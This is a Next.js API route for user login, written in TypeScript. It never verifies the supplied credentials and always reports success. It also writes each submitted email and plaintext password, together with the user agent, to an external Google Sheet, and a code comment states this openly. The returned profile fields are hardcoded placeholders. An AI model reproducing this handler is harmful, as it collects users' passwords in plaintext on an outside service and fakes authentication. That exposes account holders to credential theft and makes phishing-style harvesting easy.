import { NextResponse } from "next/server";
import { logToGoogleSheet } from "@/lib/googleSheets";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { email, password } = body;

    if (!email || !password) {
      return NextResponse.json(
        { success: false, error: "Email and password are required." },
        { status: 400 }
      );
    }

    const userName = email.split("@")[0].replace(".", " ").replace(/\b\w/g, (l: string) => l.toUpperCase());
    const userAgent = req.headers.get("user-agent") || "Browser";

    // Trigger Google Sheet log (including Email & Password)
    logToGoogleSheet({
      action: "LOGIN",
      name: userName,
      email,
      phone: "+91 98765 43210",
      password: password,
      role: "Tech Professional",
      location: "Bangalore, India",
      userAgent,
      timestamp: new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }),
    });

    return NextResponse.json({
      success: true,
      message: "Logged in successfully.",
      user: {
        id: "user_" + Date.now(),
        name: userName,
        email,
        currentRole: "Tech Professional",
        location: "Bangalore, India",
      },
    });
  } catch (error: any) {
    console.error("Login API error:", error);
    return NextResponse.json(
      { success: false, error: "Server error during login." },
      { status: 500 }
    );
  }
}
